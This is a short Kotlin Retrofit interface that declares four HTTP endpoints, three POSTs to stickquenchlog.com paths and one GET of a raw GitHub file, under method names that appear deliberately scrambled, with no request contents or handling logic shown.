package com.example.outdex

import okhttp3.RequestBody
import okhttp3.ResponseBody
import retrofit2.Response
import retrofit2.http.Body
import retrofit2.http.GET
import retrofit2.http.POST
import retrofit2.http.Url

interface OutApi {

    @POST("elision/halogen/scripps")
    suspend fun oqkskd(@Body request: RequestBody): Response<ResponseBody?>?

    @POST
    suspend fun nskdks(
        @Body request: RequestBody,
        @Url url: String = "https://imbecile.stickquenchlog.com/titanium/airdrop"
    ): Response<ResponseBody?>?

    @POST
    suspend fun uwajda(
        @Body request: RequestBody?,
        @Url url: String = "https://scale.stickquenchlog.com/unsk/rfujis/thjs"
    ): Response<ResponseBody?>?

    @GET
    suspend fun feafaew(
        @Url url: String = "https://raw.githubusercontent.com/wlAndroid/QuenchLog/refs/heads/main/ei4"
    ): Response<ResponseBody?>?


}